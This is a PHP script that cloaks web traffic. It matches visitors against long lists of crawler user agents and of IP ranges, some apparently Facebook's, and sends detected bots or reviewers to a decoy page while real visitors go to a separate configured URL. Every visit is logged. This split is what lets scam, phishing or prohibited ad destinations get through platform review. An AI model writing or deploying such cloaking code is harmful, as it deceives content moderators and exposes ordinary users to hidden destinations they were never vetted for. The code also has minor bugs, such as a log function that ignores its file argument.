<?php
require_once(__DIR__.'/config.php');

$starttime            = microtime(true);

function writeLog($message,$file = 'out')
{
    global $log_dir;
    file_put_contents($log_dir.'/out.log',$message,FILE_APPEND | LOCK_EX);
}

if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $remote_addr = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $remote_addr = $_SERVER['REMOTE_ADDR'];
}

$BOTS_USER_AGENTS = [
    'bot', 'crawl', 'slurp', 'spider', 'mediapartners', 'facebook', 'facebot', 'facebookexternalhit', 'proximic',
    'python', 'zgrab', 'guzzle', 'wget', 'yahoo', 'google', 'msnbot', 'rambler', 'accoona', 'acoirobot', 'aspseek',
    'lycos', 'scooter', 'scout', 'altavista', 'estyle', 'scrubby', 'teoma', 'baidu', 'curl', 'ips-agent', 'okhttp',
    'parser', 'SimplePie', 'checklink', '2Bone', 'httpunit', 'Go-http-client', 'BIGLOTRON', 'Gigablast', 'HTTrack',
    'webmon', 'archiver', 'findlink', 'panscient', 'yanga', 'CyberPatrol', 'postrank', 'page2rss', 'linkdex', 'ezooms',
    'heritrix', 'findthatfile', 'archive', 'Audit', 'mappydata', 'eright', 'Apercite', 'Aboundex', 'summify',
    'linkfind', 'Yeti', 'Analyzer', 'Sogou', 'wotbox', 'ichiro', 'drupact', 'coccoc', 'integromedb', 'siteexplorer',
    'proximic', 'changedetection', 'search', 'Scaper', 'g00g1e.net', 'binlar', 'index', 'ADmantX', 'ltx71', 'BUbiNG',
    'Qwantify', 'Lipper', 'Y!J', 'AddThis', 'MetaURI', 'Scrap', 'Checker', 'collection', 'DeuSu', 'Sonic', 'Sysomos',
    'Trove', "Googlebot\\/", "Googlebot-Mobile", "Googlebot-Image", "Googlebot-News", "Googlebot-Video",
    "AdsBot-Google([^-]|$)", "AdsBot-Google-Mobile", "Feedfetcher-Google", "Mediapartners-Google",
    "Mediapartners \\(Googlebot\\)", "APIs-Google", "bingbot", "Slurp", "[wW]get", "curl", "LinkedInBot",
    "Python-urllib", "python-requests", "libwww", "httpunit", "nutch", "Go-http-client", "phpcrawl", "msnbot",
    "jyxobot", "FAST-WebCrawler", "FAST Enterprise Crawler", "BIGLOTRON", "Teoma", "convera", "seekbot", "Gigabot",
    "Gigablast", "exabot", "ia_archiver", "GingerCrawler", "webmon ", "HTTrack", "grub.org", "UsineNouvelleCrawler",
    "antibot", "netresearchserver", "speedy", "fluffy", "bibnum.bnf", "findlink", "msrbot", "panscient", "yacybot",
    "AISearchBot", "ips-agent", "tagoobot", "MJ12bot", "woriobot", "yanga", "buzzbot", "mlbot", "YandexBot",
    "yandex.com\\/bots", "purebot", "Linguee Bot", "CyberPatrol", "voilabot", "Baiduspider", "citeseerxbot", "spbot",
    "twengabot", "postrank", "turnitinbot", "scribdbot", "page2rss", "sitebot", "linkdex", "Adidxbot", "blekkobot",
    "ezooms", "dotbot", "Mail.RU_Bot", "discobot", "heritrix", "findthatfile", "europarchive.org", "NerdByNature.Bot",
    "sistrix crawler", "Ahrefs(Bot|SiteAudit)", "fuelbot", "CrunchBot", "centurybot9", "IndeedBot", "mappydata",
    "woobot", "ZoominfoBot", "PrivacyAwareBot", "Multiviewbot", "SWIMGBot", "Grobbot", "eright", "Apercite",
    "semanticbot", "Aboundex", "domaincrawler", "wbsearchbot", "summify", "CCBot", "edisterbot", "seznambot",
    "ec2linkfinder", "gslfbot", "aiHitBot", "intelium_bot", "facebookexternalhit", "Yeti", "RetrevoPageAnalyzer",
    "lb-spider", "Sogou", "lssbot", "careerbot", "wotbox", "wocbot", "ichiro", "DuckDuckBot", "lssrocketcrawler",
    "drupact", "webcompanycrawler", "acoonbot", "openindexspider", "gnam gnam spider", "web-archive-net.com.bot",
    "backlinkcrawler", "coccoc", "integromedb", "content crawler spider", "toplistbot", "it2media-domain-crawler",
    "ip-web-crawler.com", "siteexplorer.info", "elisabot", "proximic", "changedetection", "arabot", "WeSEE:Search",
    "niki-bot", "CrystalSemanticsBot", "rogerbot", "360Spider", "psbot", "InterfaxScanBot", "CC Metadata Scaper",
    "g00g1e.net", "GrapeshotCrawler", "urlappendbot", "brainobot", "fr-crawler", "binlar", "SimpleCrawler",
    "Twitterbot", "cXensebot", "smtbot", "bnf.fr_bot", "A6-Indexer", "ADmantX", "Facebot", "OrangeBot\\/", "memorybot",
    "AdvBot", "MegaIndex", "SemanticScholarBot", "ltx71", "nerdybot", "xovibot", "BUbiNG", "Qwantify",
    "archive.org_bot", "Applebot", "TweetmemeBot", "crawler4j", "findxbot", "S[eE][mM]rushBot", "yoozBot", "lipperhey",
    "Y!J", "Domain Re-Animator Bot", "AddThis", "Screaming Frog SEO Spider", "MetaURI", "Scrapy", "Livelap[bB]ot",
    "OpenHoseBot", "CapsuleChecker", "collection@infegy.com", "IstellaBot", "DeuSu\\/", "betaBot", "Cliqzbot\\/",
    "MojeekBot\\/", "netEstate NE Crawler", "SafeSearch microdata crawler", "Gluten Free Crawler\\/", "Sonic",
    "Sysomos", "Trove", "deadlinkchecker", "Slack-ImgProxy", "Embedly", "RankActiveLinkBot", "iskanie", "SafeDNSBot",
    "SkypeUriPreview", "Veoozbot", "Slackbot", "redditbot", "datagnionbot", "Google-Adwords-Instant", "adbeat_bot",
    "WhatsApp", "contxbot", "pinterest.com.bot", "electricmonk", "GarlikCrawler", "BingPreview\\/", "vebidoobot",
    "FemtosearchBot", "Yahoo Link Preview", "MetaJobBot", "DomainStatsBot", "mindUpBot", "Daum\\/",
    "Jugendschutzprogramm-Crawler", "Xenu Link Sleuth", "Pcore-HTTP", "moatbot", "KosmioBot", "pingdom", "PhantomJS",
    "Gowikibot", "PiplBot", "Discordbot", "TelegramBot", "Jetslide", "newsharecounts", "James BOT", "Barkrowler",
    "TinEye", "SocialRankIOBot", "trendictionbot", "Ocarinabot", "epicbot", "Primalbot", "DuckDuckGo-Favicons-Bot",
    "GnowitNewsbot", "Leikibot", "LinkArchiver", "YaK\\/", "PaperLiBot", "Digg Deeper", "dcrawl", "Snacktory",
    "AndersPinkBot", "Fyrebot", "EveryoneSocialBot", "Mediatoolkitbot", "Luminator-robots", "ExtLinksBot", "SurveyBot",
    "NING\\/", "okhttp", "Nuzzel", "omgili", "PocketParser", "YisouSpider", "um-LN", "ToutiaoSpider", "MuckRack",
    "Jamie's Spider", "AHC\\/", "NetcraftSurveyAgent", "Laserlikebot", "Apache-HttpClient", "AppEngine-Google", "Jetty",
    "Upflow", "Thinklab", "Traackr.com", "Twurly", "Mastodon", "http_get", "DnyzBot", "botify", "007ac9 Crawler",
    "BehloolBot", "BrandVerity", "check_http", "BDCbot", "ZumBot", "EZID", "ICC-Crawler", "ArchiveBot", "^LCC ",
    "filterdb.iss.net\\/crawler", "BLP_bbot", "BomboraBot", "Buck\\/", "Companybook-Crawler", "Genieo",
    "magpie-crawler", "MeltwaterNews", "Moreover", "newspaper\\/", "ScoutJet", "(^| )sentry\\/", "StorygizeBot",
    "UptimeRobot", "OutclicksBot", "seoscanners", "Hatena", "Google Web Preview", "MauiBot", "AlphaBot", "SBL-BOT",
    "IAS crawler", "adscanner", "Netvibes", "acapbot", "Baidu-YunGuanCe", "bitlybot", "blogmuraBot", "Bot.AraTurka.com",
    "bot-pge.chlooe.com", "BoxcarBot", "BTWebClient", "ContextAd Bot", "Digincore bot", "Disqus", "Feedly", "Fetch\\/",
    "Fever", "Flamingo_SearchEngine", "FlipboardProxy", "g2reader-bot", "imrbot", "K7MLWCBot", "Kemvibot",
    "Landau-Media-Spider", "linkapediabot", "vkShare", "Siteimprove.com", "BLEXBot\\/", "DareBoost", "ZuperlistBot\\/",
    "Miniflux\\/", "Feedspot", "Diffbot\\/", "SEOkicks", "tracemyfile", "Nimbostratus-Bot", "zgrab", "PR-CY.RU",
    "AdsTxtCrawler", "Datafeedwatch", "Zabbix", "TangibleeBot", "google-xrawler", "axios", "Amazon CloudFront",
    "Pulsepoint", "CloudFlare-AlwaysOnline", "Google-Structured-Data-Testing-Tool", "WordupInfoSearch", "WebDataStats",
    "HttpUrlConnection", "Seekport Crawler", "ZoomBot", "VelenPublicWebCrawler", "MoodleBot", "jpg-newsbot", "outbrain",
    "W3C_Validator", "Validator\\.nu", "W3C-checklink", "W3C-mobileOK", "W3C_I18n-Checker", "FeedValidator",
    "W3C_CSS_Validator", "W3C_Unicorn", "Google-PhysicalWeb", "Blackboard", "ICBot\\/", "BazQux", "Twingly", "Rivva",
    "Experibot", "awesomecrawler", "Dataprovider.com", "GroupHigh\\/", "theoldreader.com", "AnyEvent", "Uptimebot",
    "Nmap Scripting Engine"
];


$redirect_ips = [
    "1.52.126.89", "1.54.40.168", "2.72.40.0", "2.79.145.204", "2.79.252.251", "2.95.222.28", "2.132.82.182",
    "2.132.208.3", "2.134.2.251", "5.9.155.37", "5.56.60.88", "5.149.250.0/24", "5.164.100.122", "5.188.62.117",
    "5.251.4.164", "13.54.98.59", "14.163.92.59", "14.163.92.120", "14.170.37.65", "14.173.30.20", "14.189.218.128",
    "14.191.50.129", "14.231.66.108", "14.233.52.89", "14.234.7.41", "14.236.97.112", "14.243.10.217", "27.3.82.172",
    "27.64.53.181", "27.64.62.10", "27.67.135.216", "27.67.188.9", "27.79.13.135", "27.97.150.0/24", "27.115.124.0/24",
    "31.13.0.0/16", "31.23.25.253", "31.41.89.183", "31.44.88.198", "31.173.0.0/16", "31.184.193.154", "34.226.200.244",
    "34.229.24.16", "34.230.67.24", "34.238.139.179", "35.172.138.134", "37.9.113.71", "37.9.113.103", "37.9.113.136",
    "37.9.118.24", "37.29.41.79", "37.150.3.147", "37.150.4.186", "37.150.123.63", "37.151.223.135", "41.33.170.105",
    "41.33.197.0/24", "42.113.184.71", "42.116.123.85", "45.64.40.0/22", "45.244.248.199", "46.16.228.113",
    "46.17.47.0/24", "46.42.245.218", "46.46.95.0/24", "46.175.103.234", "51.15.56.181", "52.23.220.176",
    "52.55.228.176", "54.67.59.131", "54.91.43.125", "54.91.58.163", "54.165.59.7", "54.173.117.182", "54.183.165.74",
    "54.248.153.153", "61.178.243.0/24", "62.182.205.151", "66.111.41.0/24", "66.160.199.90", "66.162.0.0/16",
    "66.220.144.0/16", "67.205.133.0/24", "67.205.161.19", "67.242.115.238", "68.195.100.0/24", "69.63.0.0/16",
    "69.84.207.246", "69.92.212.38", "69.171.224.1/24", "69.171.240.22", "69.171.240.117", "69.171.255.0/24",
    "71.6.202.0/24", "73.158.127.66", "74.119.76.0/22", "75.149.0.0/16", "79.234.150.31", "80.82.0.0/16",
    "80.83.234.242", "80.83.235.22", "82.146.49.0/24", "83.149.46.183", "84.21.86.0/24", "84.51.57.18", "85.26.235.14",
    "85.115.248.2", "85.117.111.197", "85.117.119.65", "85.117.119.148", "85.173.128.41", "85.173.130.109",
    "88.0.169.115", "88.85.95.0/24", "89.23.162.253", "89.35.252.164", "89.36.167.147", "89.42.60.190", "89.169.173.52",
    "89.217.84.69", "90.143.0.0/16", "91.105.238.0/24", "91.140.74.108", "91.192.67.249", "91.200.12.0/24",
    "91.213.233.197", "91.215.221.250", "91.227.68.154", "92.44.0.0/16", "92.46.253.204", "92.47.30.74",
    "92.63.99.0/24", "92.99.165.107", "93.71.143.12", "93.84.114.149", "93.88.42.176", "93.170.215.0/24",
    "93.171.3.153", "94.25.179.83", "94.233.225.129", "95.22.61.202", "95.37.251.75", "95.46.0.0/16", "95.54.57.239",
    "95.85.39.110", "95.107.82.227", "97.107.132.87", "101.99.74.121", "103.4.96.0/22", "104.192.74.42",
    "104.243.210.248", "107.23.249.130", "107.170.0.0/16", "109.127.8.178", "109.172.58.180", "109.191.5.0/24",
    "109.191.28.175", "109.228.19.159", "113.23.64.41", "113.167.214.77", "113.180.21.75", "113.181.167.232",
    "113.185.14.186", "113.186.13.205", "115.77.169.36", "115.84.232.66", "116.98.124.94", "116.105.65.158",
    "116.107.178.73", "117.4.48.180", "123.22.139.128", "125.16.216.9", "129.134.0.0/16", "138.68.65.0/24",
    "138.201.255.0/24", "139.162.113.204", "139.162.119.197", "139.184.223.161", "149.27.15.233", "157.240.0.0/16",
    "158.255.5.195", "158.255.7.1/24", "159.89.166.55", "159.89.182.213", "162.243.140.33", "162.243.142.250",
    "162.243.146.65", "162.243.167.218", "163.172.4.153", "164.52.6.0/24", "164.52.24.0/24", "165.227.92.222",
    "165.227.171.111", "166.216.165.16", "167.99.82.0/24", "170.251.43.63", "170.251.60.0/24", "171.226.203.111",
    "171.232.130.33", "171.237.62.145", "171.238.207.117", "171.253.132.51", "171.253.193.135", "172.104.108.109",
    "172.104.224.173", "173.252.0.0/16", "176.14.157.14", "176.55.137.205", "176.58.192.160", "176.99.72.147",
    "176.212.234.213", "176.221.34.225", "176.223.103.250", "178.62.4.0/24", "178.73.215.171", "178.89.152.49",
    "178.171.31.0/24", "179.60.146.12", "179.60.192.1/24", "179.60.195.0/24", "183.81.99.215", "183.81.109.5",
    "185.22.67.83", "185.57.72.28", "185.60.216.1/24", "185.60.219.0/24", "185.87.49.156", "185.89.219.249",
    "185.143.222.2", "185.148.37.32", "185.163.156.10", "188.166.174.0/24", "188.170.196.177", "188.226.172.0/24",
    "188.242.101.0/24", "188.243.234.176", "189.100.4.0/24", "190.94.135.0/24", "192.119.160.0/24", "193.12.117.0/24",
    "193.106.30.99", "193.106.49.0/24", "193.144.81.195", "194.154.70.205", "195.66.180.136", "195.201.94.148",
    "198.23.250.0/24", "199.19.249.0/24", "199.30.228.134", "204.15.20.0/22", "206.225.80.193", "207.154.0.0/16",
    "209.126.90.169", "209.126.136.0/24", "210.213.217.4", "211.25.116.0/24", "212.3.195.55", "212.96.0.0/16",
    "212.193.117.227", "212.247.225.0/24", "213.87.120.255", "213.87.155.0/24", "216.55.138.168", "217.64.113.230",
    "217.118.78.0/16", "218.2.22.0/24", "223.105.0.0/16",
];

function _bot_agent_detected($agents)
{
    $pattern = '/' . implode('|', $agents) . '/i';
    return (
        !isset($_SERVER['HTTP_USER_AGENT'])
        || preg_match($pattern, $_SERVER['HTTP_USER_AGENT'])
    );
}


function checkBotNetworks($ip, $networks)
{
    function ipInNetwork($ipBinaryString, $netAddr, $netMask = false)
    {
        $netBinaryString = sprintf("%032b", ip2long($netAddr));
        if ($netMask) {
            return (substr_compare($ipBinaryString, $netBinaryString, 0, $netMask) === 0);
        } else {
            return $ipBinaryString == $netBinaryString;
        }
    }

    $ipBinaryString = sprintf("%032b", ip2long($ip));
    foreach ($networks as $network) {
        $networkData = explode('/', $network);
        if (ipInNetwork($ipBinaryString, $networkData[0], isset($networkData[1]) ? $networkData[1] : false)) {
            return true;
        }
    }
    return false;
}
$is_bot_agent = _bot_agent_detected($BOTS_USER_AGENTS);
$is_bot_network = checkBotNetworks($remote_addr, $redirect_ips);


if ( $is_bot_agent || $is_bot_network ) {
    writeLog(preg_replace('~[\r\n]+~', '', time().'---'.$_SERVER['HTTP_USER_AGENT'] ?? '').'---'
                                .$remote_addr.'---'
                                .($is_bot_network ? 1 : 0)
                                .($is_bot_agent ? 1 : 0)
                                ."\n",'bots');
    if (filter_var($redirect_bots_to, FILTER_VALIDATE_URL)) {
         header('Location: ' . $redirect_bots_to, true, 302);
         exit();
    } else {
        echo file_get_contents($redirect_bots_to);
        exit();
    }
}

writeLog(preg_replace('~[\r\n]+~', '', time().'---'. $_SERVER['HTTP_USER_AGENT'] ?? '').'---'.$remote_addr.'---00'."\n");

try {
    if (filter_var($redirect_users_to, FILTER_VALIDATE_URL)) {
        header('Location: ' . $redirect_users_to, true, 302);
        exit();
    } else {
        echo file_get_contents($redirect_users_to);
    }
} catch (\Exception $ex) {
    echo "Error while loading content";
}

$endtime  = microtime(true);
$timediff = $endtime - $starttime;
//echo "<div>$timediff</div>";
exit();